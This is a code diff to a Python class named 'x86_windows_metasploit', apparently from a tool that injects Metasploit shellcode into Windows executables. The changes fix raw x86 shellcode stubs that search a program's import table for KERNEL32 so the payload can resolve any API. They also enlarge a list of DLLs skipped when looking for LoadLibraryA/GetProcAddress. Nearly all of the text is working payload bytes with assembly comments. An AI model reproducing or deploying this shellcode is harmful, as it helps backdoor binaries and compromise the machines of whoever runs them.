@@ -188,9 +188,11 @@ class x86_windows_metasploit:
                "\x8b\x57\x0c"                  # mov edx, dword ptr [edi + 0xc]        ;Offset for Import Directory Table Name RVA
                "\x03\xd3"                      # add edx, ebx                          ;Offset in memory
                "\x81\x3a\x4b\x45\x52\x4e"      # cmp dword ptr [edx], 0x4e52454b       ;Replace this so any API can be called
+               "\x75\x09"                      # JE short 
+               "\x81\x7A\x04\x45\x4C\x33\x32"  # CMP DWORD PTR DS:[EDX+4],32334C45 ; el32
                "\x74\x05"                      # je 0x102f                             ;jmp saveBase
                "\x83\xc7\x14"                  # add edi, 0x14                         ;inc to next import
-               "\xeb\xee"                      # jmp 0x101d                            ;Jmp findImport
+               "\xeb\xe5"                      # jmp 0x101d                            ;Jmp findImport
 
                #saveBase:
                "\x57"                          # push edi                              ;save addr of import base
@@ -264,10 +266,12 @@ class x86_windows_metasploit:
                "\x8b\x57\x0c"                  # mov edx, dword ptr [edi + 0xc]        ;Offset for Import Directory Table Name RVA
                "\x03\xd3"                      # add edx, ebx                          ;Offset in memory
                "\x81\x3a\x4b\x45\x52\x4e"      # cmp dword ptr [edx], 0x4e52454b       ;Replace this so any API can be called
+               "\x75\x09"                      # JE short 
+               "\x81\x7A\x04\x45\x4C\x33\x32"  # CMP DWORD PTR DS:[EDX+4],32334C45 ; el32
                "\x74\x05"                      # je 0x102f                             ;jmp saveBase
                "\x83\xc7\x14"                  # add edi, 0x14                         ;inc to next import
-               "\xeb\xee"                      # jmp 0x101d                            ;Jmp findImport
-
+               "\xeb\xe5"                      # jmp 0x101d                            ;Jmp findImport
+               
                #saveBase:
                "\x57"                          # push edi                              ;save addr of import base
                "\xeb\x3e"                      # jmp 0x106e                            ;jmp loadAPIs
@@ -396,13 +400,14 @@ class x86_windows_metasploit:
              "\x8b\xba\x80\x00\x00\x00"     # 0000003C  8BBA80000000      mov edi,[edx+0x80]
              "\x01\xdf"                     # 00000042  01DF              add edi,ebx
              # findImport
-             "\x8b\x57\x0c"                 # 00000046  8B570C            mov edx,[edi+0xc]
-             "\x01\xda"                     # 00000049  01DA              add edx,ebx
-             "\x81\x3a\x4b\x45\x52\x4e"     # 0000004B  813A4B45524E      cmp dword [edx],0x4e52454b
-             "\x81\x7a\x04\x45\x4c\x33\x32"  # 00000051  817A04454C3332    cmp dword [edx+0x4],0x32334c45
-             "\x74\x05"                     # 00000058  7405              jz 0x5f
-             "\x83\xc7\x14"                 # 0000005A  83C714            add edi,byte +0x14
-             "\xeb\xe7"                     # 0000005D  EBE5              jmp short 0x44
+             "\x8b\x57\x0c"                  # mov edx, dword ptr [edi + 0xc]        ;Offset for Import Directory Table Name RVA
+             "\x03\xd3"                      # add edx, ebx                          ;Offset in memory
+             "\x81\x3a\x4b\x45\x52\x4e"      # cmp dword ptr [edx], 0x4e52454b       ;Replace this so any API can be called
+             "\x75\x09"                      # JE short 
+             "\x81\x7A\x04\x45\x4C\x33\x32"  # CMP DWORD PTR DS:[EDX+4],32334C45 ; el32
+             "\x74\x05"                      # je 0x102f                             ;jmp saveBase
+             "\x83\xc7\x14"                  # add edi, 0x14                         ;inc to next import
+             "\xeb\xe5"                      # jmp 0x101d                            ;Jmp findImport
              # saveBase
              "\x57"                         # 0000005F  57                push edi
              "\xeb\x39"                     # 00000060  EB3D              jmp short 0x9f
@@ -490,13 +495,14 @@ class x86_windows_metasploit:
                      "\x8b\xba\x80\x00\x00\x00"     # 0000003C  8BBA80000000      mov edi,[edx+0x80]
                      "\x01\xdf"                     # 00000042  01DF              add edi,ebx
                      # findImport
-                     "\x8b\x57\x0c"                 # 00000046  8B570C            mov edx,[edi+0xc]
-                     "\x01\xda"                     # 00000049  01DA              add edx,ebx
-                     "\x81\x3a\x4b\x45\x52\x4e"     # 0000004B  813A4B45524E      cmp dword [edx],0x4e52454b
-                     "\x81\x7a\x04\x45\x4c\x33\x32"  # 00000051  817A04454C3332    cmp dword [edx+0x4],0x32334c45
-                     "\x74\x05"                     # 00000058  7405              jz 0x5f
-                     "\x83\xc7\x14"                 # 0000005A  83C714            add edi,byte +0x14
-                     "\xeb\xe7"                     # 0000005D  EBE5              jmp short 0x44
+                     "\x8b\x57\x0c"                  # mov edx, dword ptr [edi + 0xc]        ;Offset for Import Directory Table Name RVA
+                     "\x03\xd3"                      # add edx, ebx                          ;Offset in memory
+                     "\x81\x3a\x4b\x45\x52\x4e"      # cmp dword ptr [edx], 0x4e52454b       ;Replace this so any API can be called
+                     "\x75\x09"                      # JE short 
+                     "\x81\x7A\x04\x45\x4C\x33\x32"  # CMP DWORD PTR DS:[EDX+4],32334C45 ; el32
+                     "\x74\x05"                      # je 0x102f                             ;jmp saveBase
+                     "\x83\xc7\x14"                  # add edi, 0x14                         ;inc to next import
+                     "\xeb\xe5"                      # jmp 0x101d                            ;Jmp findImport
                      # saveBase
                      "\x57"                         # 0000005F  57                push edi
                      "\xeb\x39"                     # 00000060  EB39              jmp short 0x9f
@@ -767,7 +773,11 @@ class x86_windows_metasploit:
             sys.stderr.write("[*] Possible useful loaded modules: {0}\n".format(self.dlls))
             dllfound = False
             getprocaddress_dll = False
-            blacklist = ['kernel32.dll', 'gdi32.dll', 'firewallapi.dll', 'shell32.dll', 'user32.dll', 'oleaut32.dll', 'ws2_32.dll', 'iphlpapi.dll', ]
+            blacklist = ['kernel32.dll', 'gdi32.dll', 'ole32.dll', 'shlwapi.dll', 'firewallapi.dll', 
+                         'shell32.dll', 'user32.dll', 'oleaut32.dll', 'ws2_32.dll', 'iphlpapi.dll',
+                         'comctl32.dll', 'msvcrt.dll', 'combase.dll', 'comctl32.dll', 'rpcrt4.dll',
+                         'sspicli.dll',
+                         ]
             for dll in self.dlls:
                 sys.stderr.write('[*] Looking for loadliba/getprocaddr or just getprocaddr in %s\n' % dll)
 
